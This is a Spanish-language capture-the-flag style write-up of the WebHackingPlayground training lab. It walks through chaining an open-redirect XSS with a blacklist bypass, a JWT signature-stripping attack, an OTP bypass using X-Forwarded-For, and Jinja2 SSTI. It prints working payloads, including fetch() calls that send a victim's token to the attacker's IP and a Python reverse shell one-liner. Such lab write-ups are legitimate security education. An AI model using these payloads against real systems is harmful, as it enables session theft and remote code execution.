---
layout: single
title: WebHackingPlayground - WriteUp
excerpt: WriteUp de WebHackingPlayground creado por Takito.
date: 2023-03-06
classes: wide
header:
  teaser: /assets/images/WebHackingPlayground/WebHackingPlayground.png
  teaser_home_page: true
  icon: /assets/images/WebHackingPlayground/WebHackingPlayground.png
categories:
  - infosec
tags:
  - ctf
  - Web                                                                                                                                                                                 
  - Writeup
  - JWT
  - XSS
  - Open-Redirect                                                                                                                                                                                   
  - OTP
  - SSTI
  - SMTP
---


### Índice

1. [Contexto](#contexto)
2. [Explotación Open Redirect.](#explotación-open-redirect.)
3. [JWT Without Signature.](#jwt-without-signature.)
4. [OTP BYPASS](#otp-bypass)
5. [SMTP SSTI](#smtp-ssti)



### Contexto.

En el día de hoy estaremos resolviendo el laboratorio [WebHackingPlaygrund](https://github.com/takito1812/web-hacking-playground), creado por Victor García (Takito). Podemos desplegar el escenario haciendo uso de **Docker Compose**, en el repositorio de github está muy bien explicado.

Una vez desplegado, podremos ver que hay dos servidores web listos para su uso.

```bash
docker-compose up
Starting whp-socially      ... done
Starting whp-exploitserver ... done
Attaching to whp-socially, whp-exploitserver
whp-exploitserver |  * Serving Flask app 'app'
whp-exploitserver |  * Debug mode: off
whp-exploitserver | WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
whp-exploitserver |  * Running on all addresses (0.0.0.0)
whp-exploitserver |  * Running on http://127.0.0.1:80
whp-exploitserver |  * Running on http://172.18.0.3:80
whp-exploitserver | Press CTRL+C to quit
whp-socially     |  * Serving Flask app 'app'
whp-socially     |  * Debug mode: off
whp-socially     | WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
whp-socially     |  * Running on all addresses (0.0.0.0)
whp-socially     |  * Running on http://127.0.0.1:80
whp-socially     |  * Running on http://172.18.0.2:80
whp-socially     | Press CTRL+C to quit
```

Cabe destacar que es muy importante añadir los nombres "whp-exploitserver" y "whp-socially" al /etc/hosts. El primero (whp-exploitserver) será el servidor web vulnerable, donde tendremos que explotar vulnerabilidades y el segundo (whp-socially) simulará las peticiones de la víctima.

Dicho todo esto, podemos empezar. 

### Explotación Open Redirect.

Cuando entramos a whp-exploitserver podemos ver lo siguiente.

![](/assets/images/WebHackingPlayground/img1.png)

Si hacemos hovering sobre "Google it, yourself" podemos ver el siguiente enlace: "http://whp-exploitserver/?next=https://www.google.com". Esto nos está redirigiendo a google.com, sabiendo que tenemos un servidor para simular las peticiones de la víctima, puede que haya que explotar un Open Redirect XSS. Vamos a capturar la petición con burpsuite.

![](/assets/images/WebHackingPlayground/img2.png)

Podemos ver reflejada la url a la que hace la redirección. Vamos a probar a ver los simbolos permitidos para ver si podemso explotar un XSS.

![](/assets/images/WebHackingPlayground/img3.png)

Podemos ver que no podemos usar etiquetas HTML, pero si podemos usar algunos simbolos especiales. podemos hacer uso de esta página de hachtricks https://book.hacktricks.xyz/pentesting-web/open-redirect

Probemos el primer payload, a ver si funciona.

```js
javascript:alert(1)
```

![](/assets/images/WebHackingPlayground/img4.png)

Podemos ver que nos ha detectado el ataque, puede ser que haya una blacklist de palabras, vamos a probar.

![](/assets/images/WebHackingPlayground/img5.png)

La palabra javascript está en una blacklist, por lo tanto la cosa se complica un poco. Podemos intentar bypassear esto. Hay muchos filtros que podemos intentar aplicar, en mi caso voy a usar el siguiente.

```js
Jav%09ascript:prompt(1)
```

Podemos ver que se ejecuta correctamente.

![](/assets/images/WebHackingPlayground/img6.png)

Ahora vamos a tratar de enviarnos peticiones, para ver si podemos robarle las cookies al usuario.

```js
Jav%09ascript:Jav%09ascript:fetch(`http://172.17.0.1/`)
```

Si probamos el payload podemos ver que nos llegan las peticiones.

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.129.174 - - [06/Mar/2023 10:12:17] "GET / HTTP/1.1" 200 -
192.168.129.174 - - [06/Mar/2023 10:12:23] "GET / HTTP/1.1" 200 -
192.168.129.174 - - [06/Mar/2023 10:12:23] "GET / HTTP/1.1" 200 -
```

Ahora vamos a probar enviarnos las cookies. Usaremos el siguiente payload:

```js
%09Jav%09ascript:fetch(`http://172.18.0.1/`%2bdocument.cookie)
```

Si mandamos el enlace a la víctima, veremos que no nos llega nada... Si nos fijamos en el código fuente de la página, podemos ver el siguiente archivo Javascript.

```js
if (localStorage.getItem('token') && !document.cookie.match(/^(.*;)?\s*session\s*=\s*[^;]+(.*)?$/)) {
  $.ajax({
    url: '/session',
    type: 'GET',
    headers: {
      Authorization: `Bearer ${localStorage.getItem('token')}`,
    },
    success() {
      window.location.reload();
    },
  });
}
```

Vemos que se está usando un token para lo que parece la autorización, podemos intentar robarlo con el xss usando el siguiente payload.

```js
%09Jav%09ascript:fetch(`http://172.17.0.1/`+localStorage.getItem(`token`))
```

Con ese payload estaremos accediendo al locastore de la víctima y estaremos cogiendo el token. Si lo enviamos y revisamos nustro servidor web montado en python podemos ver la siguiente petición.

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.18.0.2 - - [06/Mar/2023 16:39:52] code 404, message File not found
172.18.0.2 - - [06/Mar/2023 16:39:52] "GET /eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzb2NpYWxseS1hcHAiLCJpZCI6NX0.0fyiW-Gft-yI3hFxLF0pWYyab7LrR-Pnl1-b904d2Qw HTTP/1.1" 404 -
```

Podemos ver el token, vamos a añadirlo a nuestro navegador y veamos si nos autenticamos.

![](/assets/images/WebHackingPlayground/img7.png)

### JWT Without Signature.

Si recargamos la página podemos ver que nos hemos autenticado como Ares.

![](/assets/images/WebHackingPlayground/img8.png)

En este laboratorio no es necesario hacer uso de fuzzing, por lo tanto vamos a analizar lo que tenemos hasta ahora. Tenemos un token:

>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzb2NpYWxseS1hcHAiLCJpZCI6NX0.0fyiW-Gft-yI3hFxLF0pWYyab7LrR-Pnl1-b904d2Qw

Si miramos las cookies podemos ver que tenemos un token parecido a un JWT.

> eyJlbWFpbCI6ImFyZXNAc29jaWFsbHkiLCJ1c2VybmFtZSI6ImFyZXMifQ.ZAYL-w.qK957MBuBqET2ePxDLIQ4cqGx1o

Si lo pasamos por JWT.io lo podemos ver decodeado.

![](/assets/images/WebHackingPlayground/img9.png)

Se ve bastante raro... Vamos a pasarle el token que se almacenaba en el LocalStorage.


![](/assets/images/WebHackingPlayground/img10.png)

Este tiene el header y el payload bien posicionados... Vamos a probar ataques basicos de JWT como eliminar la firma, o poner el algoritmo a None. Pondremos el id a 1 y sustituimos nuestro token del LocalStorage por el que nos proporciona. Si suprimimos la parte de la firma podemos ver que ocurre lo siguiente.

![](/assets/images/WebHackingPlayground/img11.png)

Si no nos inicia sesión como administradores tendremos que borrar las cookies, debido a que nos siguen identificando como el usuario ares. 

### OTP BYPASS
Una vez estamos como admins tenemos un nuevo panel que podemos ver.

![](/assets/images/WebHackingPlayground/img12.png)


Podemos enviar correos... Vamos a intentar mandarnos uno, pondré el netcat a la escucha por el puerto 25, que pone que es el por defecto.

![](/assets/images/WebHackingPlayground/img13.png)

Tenemos que saltarnos el OTP para poder enviar correos! Bien, vamos a ver como hacemos esto. Hay multiples formas de intentar bypassear un código OTP... Yo lo que intenté fue ver que pasaba si le metía cabeceras del tipo X-FORWARDED-FOR para ver si podía hacer creer al servidor que la petición era desde el propio equipo.
https://medium.com/@YumiSec/how-to-bypass-a-2fa-with-a-http-header-ce82f7927893

Si lo intentamos desde Burp podemos ver que ocurre lo siguiente...

![](/assets/images/WebHackingPlayground/img14.png)

Nos lo hemos saltado y podemos ver que para acceder al usuario que está enviando el correo, se está usando lo siguiente: {{session.\['username'\]}} Puede que sea vulnerable a SSTI. Vamos a intentar primero visualizar el contenido del correo.

Voy a usar el siguiente script para recibir los correos.

```python
from datetime import datetime
import asyncore
from smtpd import SMTPServer

class EmlServer(SMTPServer):
    no = 0
    def process_message(self, peer, mailfrom, rcpttos, data, **kwargs):
        filename = '%s-%d.eml' % (datetime.now().strftime('%Y%m%d%H%M%S'),
            self.no)
        print(filename)
        f = open(filename, 'wb')
        f.write(data)
        f.close
        print('%s saved.' % filename)
        self.no += 1

def run():
    EmlServer(('0.0.0.0', 25), None)
    try:
        asyncore.loop()
    except KeyboardInterrupt:
        pass

if __name__ == '__main__':
    run()

```


### SMTP SSTI

Si configuramos el SMTP server que apunte a nuestra IP, podemos empezar a recibir mensajes.

![](/assets/images/WebHackingPlayground/img15.png)


SI enviamos alguno de prueba podemos ver lo siguiente.

```bash
python3 smpt.py
20230306172128-0.eml
-
cat 20230306172128-0.eml      
Test message sent by admin  
```

Vamos a probar si es vulnerable a SSTI. Mandaremos el siguiente payload desde Burp.

```json
{
	"to":"172.18.0.1",
	 "message":"Test message sent by {{7*7}}"
	}
```

Si nos llega un 49, es vulnerable a SSTI y puede que podamos ejecutar comandos a nivel de sistema.

![](/assets/images/WebHackingPlayground/img16.png)

Es vulnerable a inyección de plantillas. Vamos a probar un payload tipico para explotar un RCE.

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

Si tratamos de enviar eso, podemos ver que recibimos la siguiente respuesta...

![](/assets/images/WebHackingPlayground/img17.png)

El payload es demasiado largo... Si buscamos algo en google al respecto podemos encontrar el siguiente post https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/

En el lo que hace es crear un nuevo objeto de configuración a traves de la URL y despues lo carga para ejecutar el código arbitrario. Vamos a ver como hacerlo.

Lo primero sera urlencodear el comando que queremos ejecutar, yo me estableceré una revshell con python.

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Ese payload lo url encodeamos y lo metemos como parametro get en la petición. de la siguiente forma.

![](/assets/images/WebHackingPlayground/img18.png)

El payload que estamos mentiendo en "message" permite crear el objeto de configuración "a" en este caso y tiene el contenido que le hemos pasado por get.

Ahora vamos a ver el contenido del objeto "a".

![](/assets/images/WebHackingPlayground/img19.png)


Si leemos el mail que nos llega... Podemos ver lo siguiente.

```bash
python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;172.17.0.1&#34;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;
```

Nos llega el payload decodeado, eso es que ha ido bien. Ahora vamos a tratar de ejecutar el codigio haciendo uso de popen.

![](/assets/images/WebHackingPlayground/img20.png)

Si lanzamos esa petición y nos ponemos a la escucha con netcat podemos ver como recibimos una shell.

```bash
nc -lvvp 443    
listening on [any] 443 ...
connect to [172.17.0.1] from whp-socially [172.18.0.3] 40818
/bin/sh: can't access tty; job control turned off
/app # 
```

Ya hemos acabado el laboratorio. Ha estado muy chulo, muchas gracias a Takito por crearlo. Espero que os haya servido!






















